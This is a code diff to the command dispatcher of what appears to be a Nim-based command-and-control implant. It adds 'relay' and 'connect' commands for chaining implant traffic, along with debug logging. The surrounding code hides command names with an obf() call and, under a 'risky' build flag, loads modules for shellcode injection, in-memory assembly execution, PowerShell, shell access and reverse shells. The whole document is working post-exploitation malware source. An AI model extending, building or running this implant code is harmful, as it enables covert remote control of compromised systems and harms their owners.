@@ -1,6 +1,7 @@
 import parsetoml, strutils, tables
 from ../util/crypto import xorStringToByteSeq, xorByteSeqToString
 from ../core/webClientListener import Listener
+import ../core/relay/[relay_protocol, relay_comm]
 
 # Filesystem operations
 include ../modules/filesystem/[cat, cd, cp, ls, mkdir, mv, pwd, rm]
@@ -24,8 +25,16 @@ include ../modules/screenshot/[screenshot]
 when defined risky:
     include ../modules/risky/[executeAssembly, inlineExecute, powershell, shell, shinject, reverseShell]
 
+# Relay commands
+include ../modules/relay/[relay, connect]
+
 # Parse user commands that do not affect the listener object here
 proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]) : string =
+
+    # Debug logging - show received command
+    when defined debug:
+        let argsStr = if args.len > 0: " " & args.join(" ") else: ""
+        echo "[DEBUG] Received command: " & cmd & argsStr
 
     try:
         # Parse the received command
@@ -74,6 +83,10 @@ proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]
             result = wget(li, args)
         elif cmd == obf("whoami"):
             result = whoami()
+        elif cmd == obf("relay"):
+            result = relay(args)
+        elif cmd == obf("connect"):
+            result = connect(args)
         else:
             # Parse risky commands, if enabled
             when defined risky:
@@ -100,3 +113,7 @@ proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]
             msg = getCurrentExceptionMsg()
 
         result = obf("ERROR: An unhandled exception occurred.\nException: ") & msg
+    
+    # Debug logging - show command result
+    when defined debug:
+        echo "[DEBUG] Command result: " & result
